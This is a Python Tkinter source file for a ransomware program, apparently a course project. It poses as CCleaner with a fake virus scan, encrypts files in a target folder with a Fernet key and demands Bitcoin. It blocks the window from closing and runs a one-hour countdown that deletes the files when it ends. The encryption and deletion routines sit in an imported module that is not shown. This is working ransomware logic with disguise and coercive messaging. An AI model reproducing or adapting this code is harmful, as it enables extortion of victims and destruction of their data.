import encrypter
from tkinter import *
from tkinter import messagebox
from tkinter import ttk
from datetime import datetime
from PIL import ImageTk, Image
import random

#Writes fernet key to text file on the desktop if user submits enough bitcoin
def gui_write_key(key):
    if bitcoin_entry.get() >= how_many_bitcoins_do_we_want and bitcoin_entry.get().isdigit():
        encrypter.write_key(key)
        messagebox.showinfo(title = 'Text File Created', message = "A text file has been created with the key for your files. Enter it into the input field below to get your files back. Thank you for your cooperation.")

#uses fernet key to decrypt all files in file_paths list
def gui_decrypt_files(file_paths, fernet, key):
    if key_entry.get() == key.decode("utf-8"):
        global global_status
        global_status = 'Decrypted'
        
        encrypter.decrypt_files(file_paths, fernet)

        #Message Box announcing to user that their files have been decrypted. Once the box is closed, the program terminates.
        messagebox.showinfo(title = 'Files Decrypted', message = 'Your files have been decrypted. Thank you for your cooperation. Have a nice day')

        root.destroy()

#Function to display message and prevent program from closing when user tries to exit out
def on_close():
    messagebox.showinfo(title = 'Unable to close', message = 'Cannot close program')


# GUI Stuff / Main Program Loop ==========================================================================================================================================================

#Creates and customizes GUI and is the main process
root = Tk()
root.title("CCleaner, totally not Ransomware ( ͡° ͜ʖ ͡°)")
root.iconbitmap('ccleaner.ico')
root.geometry("1280x720")
root.configure(bg = 'white')
root.protocol('WM_DELETE_WINDOW',on_close)

#Global variable to create the number of bitcoins we want user to send
how_many_bitcoins_do_we_want = str(random.randint(1,20))
global_status = 'Running'
files_generated = False

#First Tab Widgets ----------------------------------------------------------------------------------------------------------
ccleaner_name = Label(root, text="CCleaner", font = ('Trebuchet MS', 100), fg = 'grey', bg = 'white')
ccleaner_name.place(x = 500, y = 200)

ccleaner_logo = ImageTk.PhotoImage(Image.open("CCleanerLogo.png"))
skull_image = ImageTk.PhotoImage(Image.open("crossbones.png"))
cc_logo_label = Label(image = ccleaner_logo, bg = 'white')
cc_logo_label.place(x = 210, y = 150)

progress_bar = ttk.Progressbar(root, orient = HORIZONTAL, length = 400, mode = 'indeterminate')
progress_bar.place(x = 440, y = 515)
progress_bar.start(15)

scanning_text = Label(root, text="Scanning files for viruses...", font = ('Trebuchet MS', 18), fg = 'grey', bg = 'white')
scanning_text.place(x = 505, y = 545)
# ---------------------------------------------------------------------------------------------------------------------------

#Initializes 2nd tab widgets
main_text = Label(root, text="Your important financial files have just been encrypted.\nSend " +how_many_bitcoins_do_we_want + " BitCoin to us, or your files will be deleted and lost forever.\nYou have one hour.", font = ('Times New Roman', 24), fg = 'white', bg = 'red')
bitcoin_entry = Entry(root, width = 30, borderwidth = 5)
bitcoin_button = Button(root, text = "Send\nBitCoin", width = 10, height = 2, borderwidth = 5, font = ('Times New Roman', 15), command=lambda:gui_write_key(key))
key_entry = Entry(root, width = 50, borderwidth = 5)
key_button = Button(root, text = "Decrypt", width = 13, height = 2, borderwidth = 5, font = ('Arial', 18), command = lambda: gui_decrypt_files(file_paths, crypter, key))

#Calls functions to create the file paths of all files to encrypt
file_paths = encrypter.generate_file_list_keyword('C:\\Users\\bwiit\\Desktop\\CECS378Test')
files_generated = True

#Creates the Fernet object and the fernet encryption key
crypter, key = encrypter.create_key()

#Calls function to encrypt all the files in the generated file paths using the 'crypter' Fernet object
encrypter.encrypt_files(file_paths, crypter)

def tab2():

    #Removing widgets from first tab and changing background
    ccleaner_name.destroy()
    cc_logo_label.destroy()
    progress_bar.destroy()
    scanning_text.destroy()
    root.configure(bg = 'red')

    #Variable math to determine the starting time for the countdown timer
    curr_time = str(datetime.now())
    end_time = str((int(curr_time[11:13]) + 1) % 24) + curr_time[13:19]
    end_time_min = curr_time[11:14] + str((int(curr_time[14:16]) + 1) % 60) + curr_time[16:19]

    #Message Box to prevent user from panic closing the program on running, so they don't keep files encrypted forever.
    messagebox.showinfo(title = 'READ', message = "IMPORTANT. DO NOT CLOSE PROGRAM WITHOUT READING OR YOU WILL LOSE IMPORTANT FILES.")

    # Countdown Timer Stuff ---------------------------------------------------------------
    def update_time():
        format = '%H:%M:%S'
        now = (datetime.now()).strftime(format)
        string = datetime.strptime(end_time_min, format) - datetime.strptime(now, format)
        timer.config(text=string)
        if str(string) != '0:00:00':
            timer.after(1000,update_time)
        #Deletes the files, displays related message, and closes the program once the timer runs out
        if str(string) == '0:00:00' and global_status == 'Running':
            encrypter.delete_everything(file_paths)
            messagebox.showinfo(title = 'Files Deleted', message = 'The timer has reached zero, and we have not received any BitCoin from you. Your files have now been permanently deleted. Have a nice day.')
            root.destroy()
            
    #Widget for creating the timer display
    timer = Label(root, font=('Times New Roman', 70,'bold'), bg = 'red', fg = 'white')
    timer.place(x = 494, y = 295)

    #Function to initialize the timer
    update_time()
    # -------------------------------------------------------------------------------------

    #Label for the main paragraph text on the GUI
    main_text.place(x = 217, y = 190)

    #Widget for the entry box for input of the amount of bitcoin to send
    bitcoin_entry.place(x = 465, y = 428)
    bitcoin_entry.insert(0, "Enter Amount of Bitcoin to Send")
    bitcoin_entry.bind("<FocusIn>", lambda event: bitcoin_entry.delete(0,"end") if bitcoin_entry.get() == "Enter Amount of Bitcoin to Send" else None)
    bitcoin_entry.bind("<FocusOut>", lambda event: bitcoin_entry.insert(0,"Enter Amount of Bitcoin to Send") if bitcoin_entry.get() == "" else None)

    #Widget for the button that is pressed after inputting bitcoin amount to entry.
    # Runs write_key() function if amount of bitcoin sent is greater than or equal to requested amount.
    bitcoin_button.place(x = 685, y = 410)

    #Widget for the entry box for input of the Fernet key to decrypt files.
    key_entry.place(x = 481, y = 500)
    key_entry.insert(0, "Enter Key Here")
    key_entry.bind("<FocusIn>", lambda event: key_entry.delete(0,"end") if key_entry.get() == "Enter Key Here" else None)
    key_entry.bind("<FocusOut>", lambda event: key_entry.insert(0,"Enter Key Here") if key_entry.get() == "" else None)

    #Widget for the button that is pressed after inputting Fernet key.
    # Runs decrypt_files() function if Fernet key inputted matches the Fernet key generated at run time.
    key_button.place(x = 546, y = 540)

    #Labels for the skull images around the GUI
    image_label1 = Label(image = skull_image, bg = 'red')
    image_label2 = Label(image = skull_image, bg = 'red')
    image_label3 = Label(image = skull_image, bg = 'red')
    image_label4 = Label(image = skull_image, bg = 'red')
    image_label1.place(x = 0, y = 0)
    image_label2.place(x = 1051, y = 0)
    image_label3.place(x = 0, y = 500)
    image_label4.place(x = 1051, y = 500)

# ====================================================================================================================================================================================

if files_generated == True:
    tab2()

# Running main program loop
def main():
    root.mainloop()